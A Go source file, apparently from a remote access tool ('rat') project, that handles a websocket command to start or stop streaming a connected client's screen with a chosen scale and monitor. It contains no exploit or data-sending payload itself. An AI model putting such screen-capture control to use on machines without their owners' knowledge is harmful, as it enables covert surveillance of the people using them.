package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ScreenUpdateMessage struct {
	Activate bool    `json:"active"`
	Scale    float32 `json:"scale"`
	Monitor  int     `json:"monitor"`
}

func (m ScreenUpdateMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	stream := m.Activate

	if stream {
		err := sendMessage(ws, client, MonitorMessage(client.Monitors))

		if err != nil {
			return err
		}
	}

	scale := m.Scale
	monitor := m.Monitor

	client.Listeners[header.MonitorsHeader] = ws

	packet := ScreenPacket{Activate: stream, Scale: scale, Monitor: monitor}
	client.Queue <- &packet

	if !client.Screen.Streaming {
		go ScreenStream(client, ws)
	}

	client.Screen.Streaming = stream

	return nil
}
